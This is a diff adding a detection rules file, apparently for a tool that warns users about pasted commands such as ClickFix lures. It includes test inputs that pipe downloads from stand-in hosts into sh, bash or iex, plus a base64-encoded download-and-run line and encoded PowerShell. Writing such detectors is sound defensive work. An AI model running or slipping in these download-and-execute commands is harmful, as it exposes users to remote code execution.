@@ -1,0 +1,108 @@
+# Downloading code and running it straight away.
+# Hosts in tests are fictitious: reserved names (.example/.invalid/.test),
+# documentation IP ranges, or "pp-fixture-*" names. Never use real attacker
+# infrastructure here.
+schema = 1
+
+[[rule]]
+id = "PP001"
+title = "Downloads code and runs it immediately"
+severity = "caution"
+score = 35
+platforms = ["linux", "macos", "windows"]
+all = ["download_exec"]
+allowlistable = true
+explain = "Downloads a program from {host} and runs it straight away, without showing you what it is."
+advice = "Only run this if you went looking for this software yourself on its official site. Real websites never ask you to paste a command to prove you're human."
+references = ["https://attack.mitre.org/techniques/T1204/004/"]
+
+[[rule.test]]
+input = "curl -fsSL https://get.example/install.sh | sh"
+expect = "match"
+
+[[rule.test]]
+input = "/bin/bash -c \"$(curl -fsSL https://get.example/install.sh)\""
+expect = "match"
+
+[[rule.test]]
+input = "irm https://get.example/install.ps1 | iex"
+expect = "match"
+
+[[rule.test]]
+input = "curl -fsSL https://get.example/key.gpg | sudo gpg --dearmor -o /etc/apt/keyrings/x.gpg"
+expect = "no-match"
+
+[[rule.test]]
+input = "curl -s https://api.example/repos/a/b | jq .stargazers_count"
+expect = "no-match"
+
+[[rule]]
+id = "PP002"
+title = "Downloads and runs code while hiding what it does"
+severity = "danger"
+score = 70
+platforms = ["linux", "macos", "windows"]
+all = ["download_exec"]
+any = [
+  "encoded_command", "obfuscation", "whitespace_padding", "invisible_chars", "confusable_chars",
+  "decoy_comment", "hidden_window", "suspicious_tld", "url_shortener", "raw_ip_url", "punycode_host",
+  "abused_host", "plain_http", "beacon_post", "persistence", "rc_write", "security_tamper",
+  "background_detach", "lolbin_remote", "credential_exfil",
+]
+explain = "Downloads and runs a program from {host}, and also uses tricks that legitimate installers don't need (hidden text, disguised commands, a throwaway domain, or running silently in the background)."
+advice = "Do not run this. If a web page told you to paste it to 'verify you are human' or 'fix an error', close the page: it is a known malware trick called ClickFix."
+references = ["https://attack.mitre.org/techniques/T1204/004/", "https://attack.mitre.org/techniques/T1027/"]
+
+[[rule.test]]
+input = "curl -fsSL https://pp-fixture-1.lat/u/a1 | sh"
+expect = "match"
+
+[[rule.test]]
+input = "curl -s http://198.51.100.23/a | bash"
+expect = "match"
+
+[[rule.test]]
+input = "nohup bash -c 'curl -s https://get.example/a | sh' >/dev/null 2>&1 &"
+expect = "match"
+
+[[rule.test]]
+input = "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
+expect = "no-match"
+
+[[rule]]
+id = "PP003"
+title = "Decodes a hidden command and runs it"
+severity = "danger"
+score = 70
+platforms = ["linux", "macos", "windows"]
+all = ["decode_exec"]
+explain = "Decodes a hidden (encoded) command and runs it, so you can't see what it really does before it runs."
+advice = "Do not run this. Legitimate instructions show you the real command instead of hiding it in an encoded blob."
+references = ["https://attack.mitre.org/techniques/T1140/"]
+
+[[rule.test]]
+input = "echo Y3VybCBodHRwczovL2EuZXhhbXBsZSB8IHNo | base64 -d | bash"
+expect = "match"
+
+[[rule.test]]
+input = "echo aGVsbG8gd29ybGQ= | base64 -d"
+expect = "no-match"
+
+[[rule]]
+id = "PP004"
+title = "Contains an encoded command"
+severity = "caution"
+score = 25
+platforms = ["linux", "macos", "windows"]
+any = ["encoded_command"]
+explain = "Contains an encoded command that does something risky once decoded. Pasteproof has shown the decoded text below."
+advice = "Read the decoded text before running anything."
+references = ["https://attack.mitre.org/techniques/T1027/010/"]
+
+[[rule.test]]
+input = "powershell -enc ZwBlAHQALQBkAGEAdABlAA=="
+expect = "match"
+
+[[rule.test]]
+input = "echo aGVsbG8gd29ybGQ= | base64 -d"
+expect = "no-match"
